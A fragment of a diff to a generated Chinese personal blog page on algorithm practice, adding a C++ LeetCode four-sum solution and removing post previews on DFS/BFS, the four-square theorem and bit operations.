+<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">fourSum</span>(vector&lt;<span class="type">int</span>&gt;&amp; nums, <span class="type">int</span> target) &#123;</span><br><span class="line">        vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; ans;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (nums.<span class="built_in">size</span>() &lt; <span class="number">4</span>)</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    <span class="built_in">sort</span>(nums.<span class="built_in">begin</span>(), nums.<span class="built_in">end</span>());</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; nums.<span class="built_in">size</span>(); i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//跳过相同的数</span></span><br><span class="line">        <span class="keyword">if</span> (i &gt; <span class="number">0</span> &amp;&amp; nums[i] == nums[i - <span class="number">1</span>])</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = i + <span class="number">1</span>; j &lt; nums.<span class="built_in">size</span>(); j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (j &gt; i + <span class="number">1</span> &amp;&amp; nums[j] == nums[j - <span class="number">1</span>])</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            <span class="type">long</span> partSum = nums[i] + nums[j];</span><br><span class="line">            <span class="type">int</span> m = j + <span class="number">1</span>, n = nums.<span class="built_in">size</span>() - <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">while</span> (m &lt; n)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span> (partSum + nums[m] + nums[n] &lt; target)</span><br><span class="line">                    m++;</span><br><span class="line">                <span class="keyword">else</span> <span class="keyword">if</span> (partSum + nums[m] + nums[n] &gt; target)</span><br><span class="line">                    n--;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                &#123;</span><br><span class="line">                    ans.<span class="built_in">push_back</span>(vector&lt;<span class="type">int</span>&gt;&#123;nums[i], nums[j], nums[m], nums[n]&#125;);</span><br><span class="line">                    m++;</span><br><span class="line">                    <span class="keyword">while</span> (m&lt;n&amp;&amp;nums[m] == nums[m - <span class="number">1</span>])</span><br><span class="line">                        m++;</span><br><span class="line">                    n--;</span><br><span class="line">                    <span class="keyword">while</span> (m&lt;n&amp;&amp;nums[n] == nums[n + <span class="number">1</span>])</span><br><span class="line">                        n--;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
 
 
 
 
-    
 
+<p><a href="https://leetcode.cn/problems/container-with-most-water/">11. 盛最多水的容器</a></p>
+<p><a href="https://leetcode.cn/problems/max-number-of-k-sum-pairs/">1679. K 和数对的最大数目</a>（哈希表）</p>
 
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="https://destiny0118.github.io/2023/02/28/%E7%AE%97%E6%B3%95/%E5%9B%BE%EF%BC%9A%E6%8B%93%E6%89%91%E6%8E%92%E5%BA%8F%E3%80%81DFS%E3%80%81BFS/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="Destiny">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="我的个人博客">
-      <meta itemprop="description" content="凡是过去，皆为序章。">
-    </span>
-
-    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content="undefined | 我的个人博客">
-      <meta itemprop="description" content="">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/2023/02/28/%E7%AE%97%E6%B3%95/%E5%9B%BE%EF%BC%9A%E6%8B%93%E6%89%91%E6%8E%92%E5%BA%8F%E3%80%81DFS%E3%80%81BFS/" class="post-title-link" itemprop="url">DFS、BFS</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">发表于</span>
-
-      <time title="创建时间：2023-02-28 20:24:17" itemprop="dateCreated datePublished" datetime="2023-02-28T20:24:17+08:00">2023-02-28</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar-check"></i>
-      </span>
-      <span class="post-meta-item-text">更新于</span>
-      <time title="修改时间：2024-03-01 10:12:38" itemprop="dateModified" datetime="2024-03-01T10:12:38+08:00">2024-03-01</time>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <p>DFS: 寻找有效的划分方案  记忆化搜索: 将结果记录下来避免重复搜索(DP)</p>
-          <!--noindex-->
-            <div class="post-button">
-              <a class="btn" href="/2023/02/28/%E7%AE%97%E6%B3%95/%E5%9B%BE%EF%BC%9A%E6%8B%93%E6%89%91%E6%8E%92%E5%BA%8F%E3%80%81DFS%E3%80%81BFS/">
-                阅读全文 &raquo;
-              </a>
-            </div>
-          <!--/noindex-->
-        
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="https://destiny0118.github.io/2023/02/28/%E7%AE%97%E6%B3%95/%E5%9B%9B%E5%B9%B3%E6%96%B9%E6%B1%82%E5%92%8C/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="Destiny">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="我的个人博客">
-      <meta itemprop="description" content="凡是过去，皆为序章。">
-    </span>
-
-    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content="undefined | 我的个人博客">
-      <meta itemprop="description" content="">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/2023/02/28/%E7%AE%97%E6%B3%95/%E5%9B%9B%E5%B9%B3%E6%96%B9%E6%B1%82%E5%92%8C/" class="post-title-link" itemprop="url">四平方求和</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">发表于</span>
-
-      <time title="创建时间：2023-02-28 20:24:17" itemprop="dateCreated datePublished" datetime="2023-02-28T20:24:17+08:00">2023-02-28</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar-check"></i>
-      </span>
-      <span class="post-meta-item-text">更新于</span>
-      <time title="修改时间：2023-09-27 11:03:32" itemprop="dateModified" datetime="2023-09-27T11:03:32+08:00">2023-09-27</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-folder"></i>
-      </span>
-      <span class="post-meta-item-text">分类于</span>
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/algorithm/" itemprop="url" rel="index"><span itemprop="name">算法</span></a>
-        </span>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <blockquote>
-<p>四平方和定理，又称为拉格朗日定理：<br>每个正整数都可以表示为至多4个正整数的平方和。<br>如果把0包括进去，就正好可以表示为4个数的平方和。</p>
-<p>比如：<br>5 &#x3D; 0^2 + 0^2 + 1^2 + 2^2<br>7 &#x3D; 1^2 + 1^2 + 1^2 + 2^2<br>（^符号表示乘方的意思）</p>
-<p>对于一个给定的正整数，可能存在多种平方和的表示法。<br>要求你对4个数排序：<br>0 &lt;&#x3D; a &lt;&#x3D; b &lt;&#x3D; c &lt;&#x3D; d<br>并对所有的可能表示法按 a,b,c,d 为联合主键升序排列，最后输出第一个表示法</p>
-<p>程序输入为一个正整数N (N&lt;5000000)<br>要求输出4个非负整数，按从小到大排序，中间用空格分开</p>
-<p>例如，输入：<br>5<br>则程序应该输出：<br>0 0 1 2</p>
-<p>再例如，输入：<br>12<br>则程序应该输出：<br>0 2 2 2</p>
-<p>再例如，输入：<br>773535<br>则程序应该输出：<br>1 1 267 838</p>
-<p>资源约定：<br>峰值内存消耗 &lt; 256M<br>CPU消耗 &lt; 3000ms</p>
-<p>请严格按要求输出，不要画蛇添足地打印类似：“请您输入…” 的多余内容。</p>
-<p>所有代码放在同一个源文件中，调试通过后，拷贝提交该源码。</p>
-<p>注意: main函数需要返回0<br>注意: 只使用ANSI C&#x2F;ANSI C++ 标准，不要调用依赖于编译环境或操作系统的特殊函数。<br>注意: 所有依赖的函数必须明确地在源文件中 #include ， 不能通过工程设置而省略常用头文件。</p>
-<p>提交时，注意选择所期望的编译器类型。</p>
-</blockquote>
-<ul>
-<li><p><a href="https://blog.csdn.net/f_zyj/article/details/51074959">空间换时间</a></p>
-<p>最外层循环增长最慢，所以输出是非递减的</p>
-</li>
-</ul>
-<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;math.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _MAX 5000005</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="type">short</span> power[_MAX] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">solve</span><span class="params">(<span class="type">int</span> n)</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> i, j, k, temp;</span><br><span class="line">    <span class="type">double</span> x;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i * i &lt;= n; ++i) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j * j &lt;= n; ++j) &#123;</span><br><span class="line">            <span class="keyword">if</span> (power[n - i * i - j * j] == <span class="number">0</span>)</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            <span class="keyword">for</span> (k = <span class="number">0</span>; k * k &lt;= n; ++k) &#123;</span><br><span class="line">                temp = n - i * i - j * j - k * k;</span><br><span class="line">                x = <span class="built_in">sqrt</span>((<span class="type">double</span>)temp);</span><br><span class="line">                <span class="keyword">if</span> (x == (<span class="type">int</span>)x) &#123;</span><br><span class="line">                    cout &lt;&lt; i &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; j &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; k &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; x &lt;&lt; endl;</span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> n, i, j;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i * i &lt;= _MAX; ++i) &#123;</span><br><span class="line">        <span class="keyword">for</span> (j = <span class="number">0</span>; j * j &lt;= _MAX; ++j) &#123;</span><br><span class="line">            <span class="keyword">if</span> (i * i + j * j &lt;= _MAX)</span><br><span class="line">                power[i * i + j * j] = <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    cin &gt;&gt; n;</span><br><span class="line">    <span class="built_in">solve</span>(n);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>优化</li>
-</ul>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="https://destiny0118.github.io/2023/02/28/%E7%AE%97%E6%B3%95/%E4%BD%8D%E8%BF%90%E7%AE%97/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="Destiny">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="我的个人博客">
-      <meta itemprop="description" content="凡是过去，皆为序章。">
-    </span>
-
-    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content="undefined | 我的个人博客">
-      <meta itemprop="description" content="">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/2023/02/28/%E7%AE%97%E6%B3%95/%E4%BD%8D%E8%BF%90%E7%AE%97/" class="post-title-link" itemprop="url">位运算</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">发表于</span>
-
-      <time title="创建时间：2023-02-28 20:24:17" itemprop="dateCreated datePublished" datetime="2023-02-28T20:24:17+08:00">2023-02-28</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar-check"></i>
-      </span>
-      <span class="post-meta-item-text">更新于</span>
-      <time title="修改时间：2024-02-27 16:23:47" itemprop="dateModified" datetime="2024-02-27T16:23:47+08:00">2024-02-27</time>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <p>统计数字二进制表示中含有的1的个数</p>
-          <!--noindex-->
-            <div class="post-button">
-              <a class="btn" href="/2023/02/28/%E7%AE%97%E6%B3%95/%E4%BD%8D%E8%BF%90%E7%AE%97/">
-                阅读全文 &raquo;
-              </a>
-            </div>
-          <!--/noindex-->
-        
       
     </div>
 
@@ -1232,7 +1387,7 @@
 
 
   <nav class="pagination">
-    <a class="extend prev" rel="prev" href="/page/7/"><i class="fa fa-angle-left" aria-label="上一页"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/7/">7</a><span class="page-number current">8</span><a class="page-number" href="/page/9/">9</a><a class="page-number" href="/page/10/">10</a><a class="extend next" rel="next" href="/page/9/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
+    <a class="extend prev" rel="prev" href="/page/7/"><i class="fa fa-angle-left" aria-label="上一页"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/7/">7</a><span class="page-number current">8</span><a class="page-number" href="/page/9/">9</a><span class="space">&hellip;</span><a class="page-number" href="/page/11/">11</a><a class="extend next" rel="next" href="/page/9/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
   </nav>
 
 </div>
